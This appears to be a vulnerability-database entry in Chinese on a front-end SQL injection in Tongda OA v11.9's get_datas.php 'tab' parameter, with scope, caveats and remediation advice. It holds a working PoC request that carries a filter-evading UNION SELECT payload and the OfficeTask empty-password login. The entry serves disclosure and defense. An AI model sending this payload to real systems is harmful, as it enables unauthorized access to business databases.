---
source: "https://github.com/LittleBear4/OA-EXPTOOL/blob/e2beff80059570bf58292d052d97a497749d87ea/book/tongda/tongda-oav11.9-sql%E6%B3%A8%E5%85%A5.yaml"
title: "通达OA get_datas tab SQL 注入"
product: "通达OA"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "来源v11.9"
prerequisites: "OfficeTask空密码配置前提"
side_effects: "命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA-v11.9-get_datas.php-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
category_recommendation: "OA / 通达"
id: "vw-dc5b169cf31582bcaa8cb136"
entity_id: "ve-dc5b169cf31582bcaa8cb136"
schema_version: "1"
source_url: "https://github.com/LittleBear4/OA-EXPTOOL/blob/e2beff80059570bf58292d052d97a497749d87ea/book/tongda/tongda-oav11.9-sql%E6%B3%A8%E5%85%A5.yaml"
---

# 通达OA get_datas tab SQL 注入

## 条目说明

- 对象与具体问题：通达OA；get_datas tab SQLi
- 版本、配置及部署条件：来源v11.9
- 认证与权限前提：OfficeTask空密码配置前提
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 固定提交和example.invalid、版本/验证界限写得清楚
- 缺官方修复build、最低鉴权及过滤源码
- 与portal/getdata RCE不同

## 操作风险

命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

### 漏洞描述

通达 OA v11.9 的 `/general/reportshop/utils/get_datas.php` 被公开 PoC 列为前台 SQL 注入入口。请求在 `tab` 参数中构造查询表达式，并以数据库名和数据库用户回显识别注入。该请求携带 `USER_ID=OfficeTask` 与空密码，适用条件需要结合目标配置确认。

### 影响范围

来源标注 v11.9；其他版本范围未披露。本文按公开 PoC 所列产品记录，不据此扩展为全版本受影响。

### 公开验证方法

```http
GET /general/reportshop/utils/get_datas.php?USER_ID=OfficeTask&PASSWORD=&col=1,1&tab=5%20whe%5Cre%201=%7B%60%5C=%27%60%201%7D%20un%5Cion%20(s%5Celect%20database(),%20us%5Cer())--%20%27 HTTP/1.1
Host: example.invalid
```

上例对原始 YAML 的请求目标作 URL 编码，保留了反斜杠、花括号及反引号等原有字符。来源检查 200 状态码和 `td_oa`；人工核对应确认响应实际包含查询返回的数据库信息，排除固定产品文本或错误页。本文没有验证过滤绕过机制或扩展为数据导出，未进行本地复现。

### 修复建议

向通达获取适用安全更新。对报表查询接口执行服务端权限检查，避免由外部参数直接拼接表名或查询片段。

### 参考链接

- [LittleBear4/OA-EXPTOOL 原始 PoC（固定提交）](https://github.com/LittleBear4/OA-EXPTOOL/blob/e2beff80059570bf58292d052d97a497749d87ea/book/tongda/tongda-oav11.9-sql%E6%B3%A8%E5%85%A5.yaml)
